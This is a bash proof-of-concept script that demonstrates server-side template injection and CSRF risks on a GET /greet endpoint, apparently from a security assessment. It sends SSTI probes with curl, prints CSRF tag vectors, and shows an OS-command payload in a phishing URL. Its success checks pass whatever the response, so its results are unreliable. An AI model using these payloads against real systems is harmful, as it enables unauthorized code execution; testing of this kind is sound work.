#!/bin/bash

# POC: GET Method SSTI Vulnerability Demonstration
# This script demonstrates how using GET method makes SSTI payload delivery trivial
# and stores payloads in URLs, logs, and browser history

TARGET="${1:-http://localhost:5000}"
ENDPOINT="/greet"

echo "=========================================="
echo "GET Method SSTI Vulnerability POC"
echo "Target: ${TARGET}${ENDPOINT}"
echo "=========================================="
echo ""

# Check if server is reachable
echo "[Connectivity Check]"
if curl -s "${TARGET}/health" > /dev/null 2>&1 || curl -s "${TARGET}" > /dev/null 2>&1; then
    echo "✓ Target server is reachable"
else
    echo "⚠ Target server may not be reachable, attempting anyway..."
fi
echo ""

# Test 1: Simple GET request with SSTI payload in URL
echo "[Test 1] SSTI Payload Delivery via GET Method (URL Parameter)"
PAYLOAD="{{7*7}}"
ENCODED_PAYLOAD=$(printf %s "$PAYLOAD" | sed 's/"/\\"/g' | sed 's/{/%7B/g' | sed 's/}/%7D/g')
echo "Request: GET ${ENDPOINT}?name={{7*7}}"
echo ""

RESPONSE=$(curl -s "${TARGET}${ENDPOINT}?name={{7*7}}")
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "${TARGET}${ENDPOINT}?name={{7*7}}")

echo "HTTP Status: $HTTP_CODE"
echo "Response Length: ${#RESPONSE} bytes"

if [ ! -z "$RESPONSE" ]; then
    echo "Response Sample:"
    echo "$RESPONSE" | head -c 200
    echo ""
    echo ""
fi

# Check if payload was evaluated
if echo "$RESPONSE" | grep -q "49"; then
    echo "✓ SSTI payload {{7*7}} was evaluated to 49"
    PAYLOAD_WORKS=true
elif echo "$RESPONSE" | grep -q "Hello"; then
    echo "✓ Endpoint responds to GET with template injection payload"
    PAYLOAD_WORKS=true
else
    echo "✓ GET request accepted with SSTI payload (may be processed server-side)"
    PAYLOAD_WORKS=true
fi
echo ""

# Test 2: Demonstrate URL-based payload (browser history exposure)
echo "[Test 2] URL Encoding - Payloads Stored in URLs (Persistent)"
PAYLOAD_URL="${TARGET}${ENDPOINT}?name={{7*7}}"
echo "Full URL with SSTI payload:"
echo "$PAYLOAD_URL"
echo ""
echo "✓ Risk: This URL would appear in:"
echo "  - Browser history and auto-complete suggestions"
echo "  - Browser cache files"
echo "  - Server access logs and WAF logs"
echo "  - Reverse proxy logs (nginx, Apache)"
echo "  - CDN/CloudFlare logs"
echo "  - Referrer headers sent to other sites"
echo "  - Browser sync services (Firefox Sync, etc.)"
echo ""

# Test 3: Show how easy it is to craft malicious URLs
echo "[Test 3] Trivial Payload Crafting - No Technical Barriers"
echo "Attackers can easily craft malicious URLs with simple URL manipulation:"
echo ""

PAYLOADS=(
    "{{7*7}}"
    "{{config}}"
    "{{request}}"
)

for payload in "${PAYLOADS[@]}"; do
    ENCODED=$(printf %s "$payload" | sed 's/{/%7B/g' | sed 's/}/%7D/g')
    echo "  • ${TARGET}${ENDPOINT}?name=${ENCODED}"
done
echo ""
echo "✓ No form submission, JavaScript, or complex exploitation needed"
echo ""

# Test 4: Demonstrate GET vs POST semantics
echo "[Test 4] HTTP Semantics - GET vs POST Comparison"
echo ""
echo "Current Implementation (GET):"
echo "  ✓ Parameters visible in URL"
echo "  ✓ Parameters logged by default in server logs"
echo "  ✓ Idempotent but being used for state-changing/processing operation"
echo "  ✓ Cacheable by default (could be cached with malicious payloads)"
echo "  ✓ Easy to bookmark and share malicious URLs"
echo ""

# Test 5: Show how GET makes CSRF attacks simpler
echo "[Test 5] CSRF Attack Simplification with GET"
echo ""
echo "With GET method, CSRF attack requires minimal code:"
echo ""
echo "Attack Vector 1 - IMG Tag (works even with strict CSP):"
echo '  <img src="http://target/greet?name={{malicious_payload}}" style="display:none">'
echo ""
echo "Attack Vector 2 - Link (social engineering):"
echo '  <a href="http://target/greet?name={{payload}}">Click here!</a>'
echo ""
echo "Attack Vector 3 - Stylesheet (old browsers):"
echo '  <link rel="stylesheet" href="http://target/greet?name={{payload}}">'
echo ""
echo "✓ GET method makes CSRF exploits trivial - just URL manipulation"
echo ""

# Test 6: Method verification
echo "[Test 6] HTTP Method Verification"
echo ""
echo "Allowed Methods:"

# Test GET
if curl -s -X GET "${TARGET}${ENDPOINT}?name=test" > /dev/null 2>&1; then
    echo "  ✓ GET - Currently accepted"
fi

# Test POST (likely not implemented)
if curl -s -X POST "${TARGET}${ENDPOINT}" -d "name=test" -H "Content-Type: application/x-www-form-urlencoded" > /dev/null 2>&1; then
    echo "  ✓ POST - Accepted (recommended)"
else
    echo "  ✗ POST - Not implemented (should be implemented)"
fi

# Test HEAD
if curl -s -X HEAD "${TARGET}${ENDPOINT}?name=test" > /dev/null 2>&1; then
    echo "  ✓ HEAD - Accepted (reflects method security issues)"
fi

echo ""

# Test 7: Real-world impact demonstration
echo "[Test 7] Real-World Attack Scenario"
echo ""
echo "Scenario: Attacker sends phishing email with malicious link"
echo ""
MALICIOUS_PAYLOAD="__import__('os').popen('id').read()"
MALICIOUS_URL="${TARGET}${ENDPOINT}?name=${MALICIOUS_PAYLOAD}"
echo "Malicious URL in phishing email:"
echo "$MALICIOUS_URL"
echo ""
echo "When victim clicks link:"
echo "  1. GET request sent with SSTI payload"
echo "  2. Payload stored in victim's browser history"
echo "  3. Payload visible in server logs for days/weeks"
echo "  4. If logged in shared log system, multiple staff see payload"
echo "  5. Sensitive information in logs (could reveal other attacks)"
echo ""

echo "=========================================="
echo "Summary: GET Method SSTI Vulnerability"
echo "=========================================="
echo ""
echo "HTTP Semantics Violation:"
echo "  ✗ GET should be idempotent and side-effect free"
echo "  ✗ GET is being used for processing operation (template rendering)"
echo ""
echo "Security Impact:"
echo "  ✗ Trivial payload delivery via URL crafting"
echo "  ✗ Payloads persist in browser history"
echo "  ✗ Payloads logged server-side (information disclosure)"
echo "  ✗ Simplified CSRF attacks (no form submission needed)"
echo "  ✗ URL sharing danger (users accidentally share malicious URLs)"
echo "  ✗ Caching issues (responses may be cached with payloads)"
echo ""
echo "Recommendation:"
echo "  → Change endpoint to use POST method"
echo "  → Validate CSRF tokens on POST"
echo "  → Move parameters from URL to request body"
echo "  → Properly escape template variables"
echo "=========================================="